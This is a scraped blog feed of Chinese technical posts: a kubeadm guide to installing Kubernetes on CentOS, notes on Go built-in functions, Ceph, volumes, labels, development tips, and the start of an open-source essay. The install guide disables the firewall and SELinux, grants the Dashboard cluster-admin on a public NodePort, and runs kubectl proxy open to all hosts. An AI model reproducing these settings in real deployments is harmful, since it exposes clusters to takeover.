/etc/sysconfig/modules/ipvs.modules \u0026lt;\u0026lt;EOF #!/bin/bash modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack_ipv4 EOF chmod 755 /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; bash /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4 yum install -y ipset ipvsadm 2.3 安装 Docker 在每个主机上，执行命令，安装最新的 Docker 版本:\n1 2 3 4 yum install -y yum-utils device-mapper-persistent-data lvm2 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo yum install -y docker-ce-18.06.3.ce-3.el7 systemctl start docker.service \u0026amp; systemctl enable docker.service 通过执行 docker info 命令，可以看到 Docker 默认的 Cgroup Driver 为 cgroupfs。 而 Kubelet 为 systemd，与 Docker 不一致。\n这里选择，将 Docker 的 Cgroup Driver 修改为 systemd。\nmkdir -p /etc/docker cat \u0026gt; /etc/docker/daemon.json \u0026lt;\u0026lt;EOF { \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;] } EOF systemctl restart docker Docker 从 1.13 版本开始调整了默认的防火墙规则，禁用了 iptables filter 表中 FOWARD 链。这样会引起 Kubernetes 集群中跨 Node 的 Pod 无法通信。\n查看 iptables filter 表中 FOWARD 链的默认策略是否为 ACCEPT 。\n1 2 3 4 5 6 iptables -nvL Chain FORWARD (policy ACCEPT 0 packets, 0 bytes) pkts bytes target prot opt in out source destination 14105 3771K KUBE-FORWARD all -- * * 0.0.0.0/0 0.0.0.0/0 /* kubernetes forwarding rules */ 43 2656 KUBE-SERVICES all -- * * 0.0.0.0/0 0.0.0.0/0 ctstate NEW /* kubernetes service portals */ 43 2656 DOCKER-USER all -- * * 0.0.0.0/0 0.0.0.0/0 如果没有 ACCEPT ，执行命令：\n1 iptables -P FORWARD ACCEPT 2.4 安装 kubeadm、kubelet、kubectl 1 2 3 4 5 6 7 8 9 10 11 cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://packages.cloud.google.com/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=1 repo_gpgcheck=1 gpgkey=https://packages.cloud.google.com/yum/doc/yum-key.gpg https://packages.cloud.google.com/yum/doc/rpm-package-key.gpg EOF yum install -y kubelet-1.15.3-0.x86_64 kubeadm-1.15.3-0.x86_64 kubectl-1.15.3-0.x86_64 systemctl start kubelet \u0026amp;\u0026amp; systemctl enable kubelet 如果主机网络受限，可以使用其他 yum 源。\n3. Master 节点配置 3.1 kubeadm init 初始化集群 在 Master 节点上，执行命令:\n1 2 3 4 kubeadm init \\ --kubernetes-version=v1.15.3 \\ --pod-network-cidr=10.244.0.0/16 \\ --apiserver-advertise-address=192.168.10.2 kubernetes-version，指定安装版本 pod-network-cidr，指定 Pod 所属网络 apiserver-advertise-address，指定 Maser 节点 安装完毕之后，Console 会输出一段提示:\n1 2 3 4 Then you can join any number of worker nodes by running the following on each as root: kubeadm join 192.168.10.2:6443 --token 7deqem.n42r8n2rnmpzfuq7 \\ --discovery-token-ca-cert-hash sha256:7a86632f54de1004bb3f38124b663f837399d6ba9aa803d58c6707a76c02a6cb kubeadm join 这条命令将会被用于添加 Node 节点。\n3.2 配置 Kubectl 将访问凭证，拷贝到登陆用户目录下，执行命令：\n1 2 3 mkdir -p $HOME/.kube cp -i /etc/kubernetes/admin.conf $HOME/.kube/config chown $(id -u):$(id -g) $HOME/.kube/config * 查看集群状态：\n1 2 3 4 5 kubectl get cs NAME STATUS MESSAGE ERROR scheduler Healthy ok controller-manager Healthy ok etcd-0 Healthy {\u0026#34;health\u0026#34;:\u0026#34;true\u0026#34;} 3.3 安装 Pod 网络插件 网络插件，二选一:\nFlannel 1 kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml Calico 需要将 POD_CIDR 替换为 kubeadn init 中 pod-network-cid 的值，calico 中的默认值是 192.168.0.0/16。\n1 2 3 curl https://docs.projectcalico.org/v3.8/manifests/calico.yaml -O sed -i -e \u0026#34;s?192.168.0.0/16?10.244.0.0/16?g\u0026#34; calico.yaml kubectl apply -f calico.yaml 3.4 允许 Master 运行 Pod 1 2 kubectl taint nodes --all node-role.kubernetes.io/master- node/i-6fns0nua untainted 3.5 安装 Dashboard 下载最新的 kubernetes-dashboard.yaml 1 wget https://raw.githubusercontent.com/kubernetes/dashboard/v1.10.1/src/deploy/recommended/kubernetes-dashboard.yaml 编辑 kubernetes-dashboard.yaml，修改服务类型和端口 为了外网可以直接访问，需要将 Dashboard Service 改为 NodePort，同时指定访问端口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ... # ------------------- Dashboard Service ------------------- # kind: Service apiVersion: v1 metadata: labels: k8s-app: kubernetes-dashboard name: kubernetes-dashboard namespace: kube-system spec: type: NodePort # 添加 ports: - port: 443 targetPort: 8443 nodePort: 30002 # 指定端口（可选，如果不指定，端口将随机分配） ... 创建 dashboard 1 kubectl create -f kubernetes-dashboard.yaml 添加 admin 用户 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 cat dashboard-user.yaml apiVersion: v1 kind: ServiceAccount metadata: name: dashboard-admin namespace: kube-system --- kind: ClusterRoleBinding apiVersion: rbac.authorization.k8s.io/v1beta1 metadata: name: dashboard-admin subjects: - kind: ServiceAccount name: dashboard-admin namespace: kube-system roleRef: kind: ClusterRole name: cluster-admin apiGroup: rbac.authorization.k8s.io 执行命令:\n1 kubectl create -f dashboard-user.yaml 查看 admin 用户登录的 token\n1 kubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin | awk \u0026#39;{print $1}\u0026#39;) | grep token: | awk -F : \u0026#39;{print $2}\u0026#39; | xargs echo 访问 dashboard 查看服务端口:\n1 2 3 kubectl -n kube-system get svc kubernetes-dashboard NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes-dashboard NodePort 10.110.76.188 \u0026lt;none\u0026gt; 443:30002/TCP 100m 打开地址：https://\u0026lt;host_ip\u0026gt;:30002/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/。选择 token 认证，输入上一步 Console 输出的字符串即可。\n除了修改 Dashboard Service 类型之外，还可以使用 kubectl proxy 允许外网访问 dashboard。\n1 kubectl proxy --address 0.0.0.0 --accept-hosts \u0026#39;.*\u0026#39; 3.5 测试集群 DNS 是否可用 创建容器，并进入终端：\n1 2 3 kubectl run curl --image=radial/busyboxplus:curl -it kubectl run --generator=deployment/apps.v1 is DEPRECATED and will be removed in a future version. Use kubectl run --generator=run-pod/v1 or kubectl create instead. If you don\u0026#39;t see a command prompt, try pressing enter. 使用 curl 命令，测试一下 DNS 和网络：\n1 [ root@curl-66959f6557-c5n47:/ ]nslookup kubernetes.default 4. 添加 Node 在每个 Node 节点上，以 root 用户权限，执行命令:\n1 2 kubeadm join 192.168.10.2:6443 --token 7deqem.n42r8n2rnmpzfuq7 \\ --discovery-token-ca-cert-hash sha256:7a86632f54de1004bb3f38124b663f837399d6ba9aa803d58c6707a76c02a6cb 5. 配置远程 Kubectl 访问 在 Master 节点上，查看访问凭证 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 cat /etc/kubernetes/admin.conf apiVersion: v1 clusters: - cluster: certificate-authority-data: LS0tLS1CRU...0tLQo= server: https://host_ip:6443 name: kubernetes contexts: - context: cluster: kubernetes user: kubernetes-admin name: kubernetes-admin@kubernetes current-context: kubernetes-admin@kubernetes kind: Config preferences: {} users: - name: kubernetes-admin user: client-certificate-data: LS0tLS....tLS0tCg== 在本地电脑上，新增配置 将上一步配置中的 host_ip，替换为 kubernetes, kubernetes.default, kubernetes.default.svc, kubernetes.default.svc.cluster.local 之一。以 kubernetes.default.svc.cluster.local 为例。\n添加 hosts 配置:\n1 2 cat /etc/hosts \u0026lt;host_ip\u0026gt; kubernetes.default.svc.cluster.local 如果不通过配置 hosts 进行访问，会提示证书不符的错误。\n本地访问测试：\n1 2 3 4 5 kubectl get cs NAME STATUS MESSAGE ERROR controller-manager Healthy ok scheduler Healthy ok etcd-0 Healthy {\u0026#34;health\u0026#34;:\u0026#34;true\u0026#34;} 6. 安装命令汇总 全新 CentOS 7，安装 Kubelet 环境。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 systemctl stop firewalld systemctl disable firewalld setenforce 0 sed -i \u0026#39;s/SELINUX=permissive/SELINUX=disabled/\u0026#39; /etc/sysconfig/selinux swapoff -a sed -i \u0026#39;s/.*swap.*/#\u0026amp;/\u0026#39; /etc/fstab cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysctl.d/k8s.conf net.bridge.bridge-nf-call-ip6tables = 1 net.bridge.bridge-nf-call-iptables = 1 net.ipv4.ip_forward=1 vm.swappiness=0 EOF sysctl --system cat \u0026gt; /etc/sysconfig/modules/ipvs.modules \u0026lt;\u0026lt;EOF #!/bin/bash modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack_ipv4 EOF chmod 755 /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; bash /etc/sysconfig/modules/ipvs.modules \u0026amp;\u0026amp; lsmod | grep -e ip_vs -e nf_conntrack_ipv4 yum install -y ipset ipvsadm yum install -y yum-utils device-mapper-persistent-data lvm2 yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo yum install -y docker-ce-18.06.3.ce-3.el7 systemctl start docker.service \u0026amp; systemctl enable docker.service mkdir -p /etc/docker cat \u0026gt; /etc/docker/daemon.json \u0026lt;\u0026lt;EOF { \u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;] } EOF systemctl restart docker cat \u0026lt;\u0026lt;EOF \u0026gt; /etc/yum.repos.d/kubernetes.repo [kubernetes] name=Kubernetes baseurl=https://packages.cloud.google.com/yum/repos/kubernetes-el7-x86_64 enabled=1 gpgcheck=1 repo_gpgcheck=1 gpgkey=https://packages.cloud.google.com/yum/doc/yum-key.gpg https://packages.cloud.google.com/yum/doc/rpm-package-key.gpg EOF yum install -y kubelet-1.15.3-0.x86_64 kubeadm-1.15.3-0.x86_64 kubectl-1.15.3-0.x86_64 systemctl start kubelet \u0026amp;\u0026amp; systemctl enable kubelet ","description":"","id":363,"section":"post","tags":["博文","Kubernetes","Kubeadm","安装"],"title":"使用 Kubeadm 安装 Kubernetes 集群","uri":"https://www.chenshaowen.com/blog/using-kubeadm-to-install-the-kubernetes-cluster.html"},{"content":"1. main 和 init 函数 一个 package 里面可以写多个 init 函数，但必须仅包含一个 main 函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package main import ( \u0026#34;fmt\u0026#34; ) func init() { fmt.Println(\u0026#34;init 1\u0026#34;) } func init() { fmt.Println(\u0026#34;init 2\u0026#34;) } func main() { fmt.Println(\u0026#34;main\u0026#34;) } // init 1 // init 2 // main 2. defer 函数 Go 不会立即执行 defer 修饰的代码，而是进行标记，在程序退出之前执行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import ( \u0026#34;fmt\u0026#34; ) func main() { defer func() { fmt.Println(\u0026#34;before exit, in defer\u0026#34;) }() fmt.Println(\u0026#34;I am in main\u0026#34;) } // I am in main // before exit, in defer 3. panic 和 recover 函数 Go 中的异常处理：抛出一个 panic ，然后在 defer 中使用 recover 捕获异常，并将 panic 抛向上一层。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package main import ( \u0026#34;fmt\u0026#34; ) func main() { defer fmt.Println(\u0026#34;I am in main\u0026#34;) defer func() { if err := recover(); err != nil { fmt.Println(err) // do something } }() panic(\u0026#34;error message\u0026#34;) } // error message // I am in main 4. new 和 make 函数 new 函数 原型：\n1 func new(Type) *Type 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package main import ( \u0026#34;fmt\u0026#34; ) func main() { tmp := new(int) fmt.Printf(\u0026#34;tmp --\u0026gt; %#v \\n\u0026#34;, tmp) fmt.Printf(\u0026#34;tmp point to --\u0026gt; %#v \\n \u0026#34;, *tmp) } // tmp --\u0026gt; (*int)(0x40e020) // tmp point to --\u0026gt; 0 new 用来分配内存，参数是类型，返回值是一个指向分配零值的指针。\nmake 函数 原型：\n1 func make(Type, size IntegerType) Type 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package main import ( \u0026#34;fmt\u0026#34; ) func main() { var s1 []int fmt.Printf(\u0026#34;s1 is --\u0026gt; %#v \\n\u0026#34;, s1) s2 := make([]int, 3) fmt.Printf(\u0026#34;s2 is --\u0026gt; %#v \\n\u0026#34;, s2) } // s1 is --\u0026gt; []int(nil) // s2 is --\u0026gt; []int{0, 0, 0} make 用来为 slice，map 或 chan 类型分配内存、并初始化一个对象，参数是类型。但 make 返回类型的引用而不是指针。\n区别：new 仅将内存置零，而 make 会对 slice、map、chan 引用的数据进行初始化。\n","description":"","id":364,"section":"post","tags":["博文","Go","一起来学Go","函数"],"title":"一起来学 Go --（4）常用函数","uri":"https://www.chenshaowen.com/blog/let-us-start-learning-go-4.html"},{"content":"1. 不同种类的存储 1.1 文件存储 文件存储是，基于文件的存储。在访问数据时，需要提供相应的查找路径。\n适用于，FTP、NFS 等服务。\n1.2 块存储 块存储是，将数据拆分成块，并单独存储各个部分。在访问数据时，底层存储软件会将这些分散的数据组装起来。\n块存储，通常部署在存储区域网络（SAN）中，方便快速检索，易于使用和管理。\n适用于，磁盘阵列、硬盘等服务。\n1.3 对象存储 对象存储是，将数据分解为对象的离散单元，保存在单个存储库。每个对象存储卷都是一个自包含式数据库，用户可以分布式的查找对象、元数据。\n对象存储要求一次性完整写入，无法修改对象。\n适用于，Ceph 等大容量的分布式存储。\n2. Ceph Ceph 是一种基于通用硬件设计的高可靠、可扩展的分布式存储系统，同时支持三种存储，文件存储、块存储、对象存储。\nCeph 底层采用的是 RADOS ，RADOS 自身是一个完整的分布式对象存储系统。\n2.1 Ceph 的核心组件 Mo 监控，监控集群状态，维护展示集群状态的图表，例如 OSD Map、Monitor Map、PG Map 、CRUSH Map。 MDS （可选）元数据服务，保存文件系统的元数据，管理目录结构。 OSD 存储服务，负责存储、复制、平衡、恢复数据，与其他 OSD 进行心跳检查，通常一块硬盘对于一个 OSD。 2.2 Ceph 的存储过程 Ceph 底层采用 CRUSH 算法进行存储，如上图，下面是存储过程：\n第一步，将数据分割成多个 Object ，Object 是 Ceph 最小的存储单元。每个 Object 一个 Object id ，大小可设置，默认是 4 MB。\n第二步，为了减少 Object 到 OSD 的索引表，引入 Placement Group （PG）进行管理。Object 通过 Hash ，映射到 PG ，每个 PG 包含多个 Object。\n第三步，PG 再通过 CRUSH 算法，映射到 OSD。如果是多副本，每个 PG 会映射到多个 OSD。\n2.3 Ceph 部署 ceph-deploy 是 Ceph 官方提供的部署工具。它通过 SSH 远程登录其他节点，然后执行命令完成部署过程。\n通常，部署一个 Ceph 集群需要如下步骤：\n规划集群节点 配置用户、免密 ssh、Hosts 安装 ceph-deploy、ceph 部署 monitors、managers、MDS、OSD 3. Kubernetes 中的 Ceph 3.1 直接使用 PV/PVC 的问题 关于 PV 和 PVC 的介绍，可以参考，PV、PVC。\n管理员需要预先分配 PV。当用户创建 PVC 请求存储时，Kubernetes 将尝试用 PVC 与预分配的 PV 匹配。如果找到匹配项，则将 PVC 绑定到 PV ，提供给用户使用。\n在这种匹配策略下，管理员无法精确满足每个用户的需要，只有不断地调整 PV 的大小。这将给存储运维带来沉重的负担。\n为此，Kubernetes 1.6 版本中，引入了动态纳管、StorageClass、Provisioner 。管理员使用 Storage Class 来描述提供的存储。StorageClass 包含容量、IOPS 等一系列参数信息。存储供应商 Provisioner 根据 StorageClass 中设置的参数动态分配 PV。\n3.2 Provisioner 当用户通过 PVC 对存储资源进行申请时， StorageClass 会使用 Provisioner 来自动创建用户所需的 PV。\n上图详细流程分析如下：\n（1）Pod 加载存储卷，请求 PVC\n（2）PVC 根据存储类型（此处为 rbd ）找到存储类 StorageClass\n（3）Provisioner 根据 StorageClass 动态生成一个持久卷 PV\n（4）持久卷 PV 和 PVC 最终形成绑定关系\n（5）持久卷 PV 开始提供给 Pod 使用\n通过配置不同的 Provisioner，StorageClass 支持多种类型的存储卷。目前已经支支持很多种类，AWSElasticBlockStore、AzureFile、AzureDisk、Cinder、Flocker、GCEPersistentDisk、Glusterfs、PhotonPersistentDisk、Quobyte、RBD、VsphereVolume、PortworxVolume、ScaleIO、StorageOS 等。\n除了上面 Kubernetes 原生支持的类型，通过安装扩展插件，能够支持更多存储类型。例如，NFS 的 nfs-client-provisioner。\nCeph 通过 RDB 的方式提供 Provisioner 给 StorageClass 创建 PV。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: fast provisioner: kubernetes.io/rbd parameters: monitors: 10.16.153.105:6789 adminId: kube adminSecretName: ceph-secret adminSecretNamespace: kube-system pool: kube userId: kube userSecretName: ceph-secret-user userSecretNamespace: default fsType: ext4 imageFormat: \u0026#34;2\u0026#34; imageFeatures: \u0026#34;layering\u0026#34; 4. 参考 https://www.redhat.com/zh/topics/data-storage/file-block-object-storage http://docs.ceph.org.cn/start/intro/ https://amito.me/2018/Install-and-Configure-Ceph-on-CentOS-7/ http://bucket.k8smeetup.com/Kubernetes%E5%AD%98%E5%82%A8%E6%A6%82%E8%A7%88%20\u0026amp;%20Volume%20Provisioner%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf ","description":"","id":365,"section":"post","tags":["整理","Kubernetes","Ceph","存储"],"title":"Kubernetes 中的 Ceph","uri":"https://www.chenshaowen.com/blog/ceph-in-kubernetes.html"},{"content":"1. Docker 的存储卷 1.2 Docker 中的 Volume Docker Volume 将宿主机目录，挂载到容器中。在容器中修改的文件内容，将会被持久化到宿主机中。即时容器被删除，宿主机中的文件也会被保留。\nDocker 使用 /var/lib/docker/volumes/ 存储容器的 Volume。\n查看本地 Volume ：\n1 2 3 4 5 6 7 8 9 tree /var/lib/docker/volumes/ -L 3 /var/lib/docker/volumes/ |-- 714450f353b26b5aa57aa352766c201c0851685e0e28c2e67ae1631f29c465b4 | `-- _data | |-- access.log -\u0026gt; /dev/stdout | `-- error.log -\u0026gt; /dev/stderr |-- metadata.db `-- volume_name `-- _data 当创建 Volume 时，Docker 会在 /var/lib/docker/volumes/ 目录下创建文件夹用于存储数据。在停止或销毁容器之后，Volume 中的数据依然持久存在。\n1.2 Docker Volume 的操作 创建一个 Volume :\n1 docker volume create volume_name 查看所有的 Volume :\n1 docker volume ls 查看 Volume 的详情 ：\n1 docker volume inspect volume_name 删除 Volume :\n1 docker volume rm volume_name 挂载 Volume 到容器 :\n1 docker run -it -v volume_name:/data centos /bin/bash 2. Kubernetes 中的存储卷 2.1 Kubernetes 的 Volume 每个 Node 都会有 Container Runtime，这里以 Docker Runtime 为例。如果按照 Docker Volume 的方式挂载，会遇到问题：由于 Kubernetes 对 Pod 的自由调度，Pod 中的容器与 Node 没有绑定关系，不能保证 Volume 一定能挂载成功，也不能保证数据的完整性和一致性。\n解决办法很常规，使用服务提供有状态的功能。Kubernetes 提供了 PV 和 PVC 的方式使用 Volume 。\n对于一个独立的存储后端，实现可以是 NFS、Ceph、GlusterFS 等。PV 可以从中划分一部分用于 Kubernetes 的存储，而生命周期不依赖于 Pod。容器是 Volume 的真实使用者，Pod 中的每个容器都必须指定每个 Volume 的挂载位置。\n使用 Volume 时，需要给 Pod 指定为卷 （spec.volumes 字段）以及将它挂载到容器的位置 （spec.containers.volumeMounts 字段）\n2.2 存储插件 在 Kubernetes 中使用存储插件提供 Volume 的支持。Kubernetes 中的存储插件分为:\nin-tree in-tree 插件运行在 Kubernetes 核心组件中。当需要使用相应的 Volume 服务时，需要调用核心组件中的插件。\nKubernetes 原生支持的 Volume 类型：\nGCEPersistentDisk、AWSElasticBlockStore、AzureFile、AzureDisk、FC (Fibre Channel)、FlexVolume、Flocker、NFS、iSCSI、CephFS、Cinder (OpenStack block storage)、Glusterfs、VsphereVolume、Quobyte Volumes 等。\nout-of-tree out-of-tree 插件的代码和部署独立于 Kubernetes。通常用于补充 in-tree 不支持的存储类型，或者对存储功能进行定制、扩展。\n从 1.8 版开始，Kubernetes Storage SIG 停止接受 in-tree 插件，并建议所有存储提供商使用 out-of-tree 插件。目前有两种推荐的实现方式：容器存储接口（CSI）和 Flexvolume 。\n2.3 PV、PVC PV 为 PersistentVolume 的缩写，PVC 为 PersistentVolumeClaim 的缩写。\nPV 和 PVC 是 Kubernetes 提供的两种资源，用户可以通过 API 对其进行操作。\n管理员只需要关注如何通过 PV 提供存储功能，而不需要关注用户如何使用。\n用户只需要关注如何挂载 PVC 到容器中，而不需要关注存储卷如何实现。\n在使用 Volume 时，通常分为如下几步：\n创建 Persistent Volume 创建 Persistent Volume Claim 创建 Pod 并使用 PVC 3. 参考 https://jimmysong.io/posts/kubernetes-volumes-introduction/ ","description":"","id":366,"section":"post","tags":["整理","Kubernetes","学习"],"title":"Kubernetes 之 Volumes","uri":"https://www.chenshaowen.com/blog/volumes-of-kubernetes.html"},{"content":"1. Labels 1.1 什么是 Labels Labels 是一对关联到对象的键值对。可以在创建对象时，直接添加 Labels ，也可以在创建之后动态修改。\nLabels 格式:\n1 2 3 4 \u0026#34;labels\u0026#34;: { \u0026#34;key1\u0026#34; : \u0026#34;value1\u0026#34;, \u0026#34;key2\u0026#34; : \u0026#34;value2\u0026#34; } 格式要求：\nKey，不能重复 Value，须以字母或数字开头，可以使用字母、数字、连字符、点和下划线，最长63个字符 1.2 Labels 的用途 用户使用 Labels，对资源对象进行标识、组织和选择。\n标签对于系统运行，没有直接意义，也不用于存储结构化或复杂数据。因为，标签将建立索引和反索引，用于查询和监控。\n对于附加在资源对象上的复杂结构，应该使用 annotation。\nannotation 可以将任意非标识元数据附加到对象上。使用工具和类库等客户端，我们可以检索这些数据。annotation 中的元数据可以是结构化的，也可以是非结构化的，同时对字符范围没有限制。\n1.3 Labels 操作 查看名字为 name 的 Pod 详情 1 kubectl describe pods name 给名字为 name 的 Pod 添加 Label: tempLabel=True 1 2 kubectl label pods name tempLabel=True pod/name labeled 将名字为 name 的 Pod 修改为 Label: tempLabel=False 1 2 kubectl label --overwrite pods name tempLabel=False pod/name labeled 给所有 Pod 添加 Labels 1 2 3 kubectl label pods --all tempLabel2=True pod/kube-nginx-7c765ffd95-2pxfk labeled ... 删除名字为 name 的 Pod 中，Key 为 tempLabel 的 Labels 删除时，只需要在 Key 值后面拼上 - 即可。\n1 2 kubectl label pods name tempLabel- pod/name labeled 2. Labels Selectors 2.1 什么是 Labels Selectors Labels Selectors，即标签选择器。\n标签选择器是 Kubernetes 中的核心组成部分。在使用的过程当中，通常多个对象具有相同的标签。通过标签过滤出一组资源对象，批量进行操作。\n2.2 Labels Selectors 的类型 Kubernetes 的 API 目前支持两种类型的选择器：\nequality-based，基于等式 基于等式的标签条件支持三种操作符：=、==、！=。其中，= 与 == 同义，多个条件可以使用逗号分隔连接。例如：\n1 frontend：environment=production, tier!=frontend set-based，基于集合 基于集合的标签条件支持三种操作符： in ， notin 和 exists。例如：\n1 2 3 4 environment in (production, qa) tier notin (frontend, backend) partition !partition 2.3 如何使用 Labels Selectors 使用 API 进行查询过滤时，添加 GET 过滤参数即可 基于等式:\n?labelSelector=environment%3Dproduction,tier%3Dfrontend\n基于集合:\n?labelSelector=environment+in+%28production%2Cqa%29%2Ctier+in+%28frontend%29\n使用 Kubectl 在 Console 中进行操作 基于等式:\n1 kubectl get pods -l environment=production,tier=frontend 基于集合:\n1 kubectl get pods -l \u0026#39;environment in (production),tier in (frontend)\u0026#39; 3. Field Selectors Field Selectors，字段选择器允许通过字段值过滤，来筛选资源对象。\n不同的资源对象，支持的过滤字段不同。所有资源类型都支持 metadata.name 和 metadata.namespace 字段过滤。\n下面是一个使用样例，选择 phase 字段为 Running 的所有 Pod :\n1 2 3 4 5 kubectl get pods --field-selector status.phase=Running NAME READY STATUS RESTARTS AGE kube-nginx-7c765ffd95-2pxfk 1/1 Running 3 17d my-harbor-harbor-chartmuseum-567fb69cb6-q88ss 1/1 Running 0 3d20h ... ","description":"","id":367,"section":"post","tags":["整理","Kubernetes","学习"],"title":"Kubernetes 之 Labels、Selectors","uri":"https://www.chenshaowen.com/blog/labels-and-selectors-of-kubernetes.html"},{"content":" 主要记录最近遇到的一些开发问题，解决方法。\n1. VS Code 终端执行 .bash_profile 初始化脚本 通过添加启动命令参数，可以使得打开 shell 时，执行初始化脚本 .bash_profile 。\n编辑 settings.json，以 OS X 为例，新增如下内容即可：\n1 2 3 { \u0026#34;terminal.integrated.shellArgs.osx\u0026#34;: [\u0026#34;-l\u0026#34;] } 2. VS Code 配置 zsh 后，图标无法显示 由于安装补丁字体之后，VS Code 无法自动检测到，需要在 settings.json 中进行配置。\n1 2 3 { \u0026#34;terminal.integrated.fontFamily\u0026#34;: \u0026#34;Source Code Pro for Powerline\u0026#34; } 参考: https://gist.github.com/kevin-smets/8568070\n3. OS X 制作 CentOS 启动盘 查看 U 盘的挂载点 1 2 3 4 5 diskutil list /dev/disk2 (external, physical): #: TYPE NAME SIZE IDENTIFIER 0: FDisk_partition_scheme *7.8 GB disk2 1: Windows_FAT_32 ESD-ISO 7.8 GB disk2s4 卸载 U 盘 1 2 diskutil unmountDisk /dev/disk2 Unmount of all volumes on disk2 was successful 写入 ISO 镜像 1 sudo dd if=/your_real_path/CentOS-7-x86_64-DVD-1810.iso of=/dev/rdisk2 bs=1m if 参数指定待写入文件位置，of 参数指定输出文件位置，这里的意思是，将镜像写入到 U 盘中。需要注意的是，rdisk2 表示的是 disk2 的原始盘，bs=1m 表示写入块的大小为 1MB ，目的是为了更快写入数据。\n可以通过 Ctrl + T 查看写入进度。\n弹出 U 盘 大约几分钟之后，写入完毕。弹出 U 盘:\n1 diskutil eject /dev/disk2 4. 如何运行一个 Go 写的项目 通过 Readme 文档、Makefile 文件、脚本，通常可以快速了解如何运行一个 Go 写的项目。但有时，由于资料不完善，需要自己尝试摸索。\n4.1 包含 Gopkg.lock 和 Gopkg.toml 文件的项目 Gopkg.local 和 Gopkg.toml 是 dep 用于包管理的两个文件，需要将项目拷贝到 $GOPATH/src 目录下。\n如果项目目录下，还有 vendor 目录，可以找到入口文件（通常是 main.go ），直接执行编译命令。\n1 go build main.go 如果没有 vendor 目录，则需要首先安装依赖包。\n安装 dep 1 go get -u github.com/golang/dep/cmd/dep 安装依赖 1 dep ensure dep 会将依赖安装到当前项目的 vendor 目录下。安装完毕，再执行编译命令。\n4.2 包含 go.sum 和 go.mod 文件的项目 go.sum 和 go.mod 是 Go Modules 用于包管理的两个文件。\n如果项目下有 vendor 文件夹，那么直接编译即可。\n1 go build main.go 如果项目下没有 vendor 文件夹，则需要首先安装依赖包。\ngo module 是 go 1.11 版本内置的特性，不需要安装。安装依赖包：\n1 go mod download ","description":"","id":368,"section":"post","tags":["博文","Tips","Go","VSCode"],"title":"开发 Tips（10）","uri":"https://www.chenshaowen.com/blog/developing-tips-10.html"},{"content":" Adobe 以 16.7 亿美元收购 Magento，微软以 75 亿美元收购 GitHub，IBM 以 340 亿美元收购 Red Hat，开源原来也是一门好生意。本文主要是关于开源的一些记录和思考。\n1. 什么是开源 1.1 发展史 1969 年，贝尔实验室将 Unix 代码共享给社区，为开源奠定了重要基础。\n1984 年，Richard Stallman 离开 MIT，发起 GUN 项目，希望使用自由代码构建一个类 Unix 的操作系统。此后，Stallman 创立自由软件基金会（FSF），发起 GNU 通用公共协议证书（GNU General Public License, GNU GPL），开发了 GCC、Emacs 等一系列重要产品。\n1991 年，Linus Torvalds 在 GPL 协议下发布了 Linux 操作系统内核。\n1995 年，Apache 诞生，随即占据 Web 服务器大部分市场份额。\n2000 年，开源延伸至移动和云领域，由 Google 等大企业驱动，影响技术发展路线和市场格局。\n2008 年，Github 等代码托管平台，采用 pull/request 等方式协同合作，将开源推向了新高度。\n2014 年，Google 开源 Kubernetes，获得极大关注。经过几年发展，Kubernetes 成为事实上的分布式架构平台。\n伴随着这些事件，还有一系列基金会被创立。这些基金会通过内部优先、资金资助等形式，有力地推动了开源运动的进展。\n值得说明的是，自由软件和开源基本上指的是同一范围的程序。它们的区别更多在价值观上。\n1.2 开源协议 开源协议用于维护作者和贡献者的合法权益，保证开源项目不被商业机构或个人窃取，从而影响项目发展。\n下面这张图，对主流的六种开源协议 GPL、BSD、MIT、Mozilla、Apache、LGPL，进行了清晰、简洁的讲解。\n2. 开源带来的好处 2.1 更好的宣传 对于销售人员来说，开源是非常有利的优势，代表着开放、先进的研发理念和技术。对于招聘人员来说，开源可以吸引更优秀的工程师。\n在社区中，开源项目会引起更多人的关注和讨论，是宣传产品的机会，能提升组织在领域的影响力。\n项目开源也能增强用户的尝试意愿，没有太多风险。用户早期几乎没有成本，深入使用之后，还能修改源码定制。开源项目具有透明性、可信任、可持续的特点。\n2.2 更好的开发实践 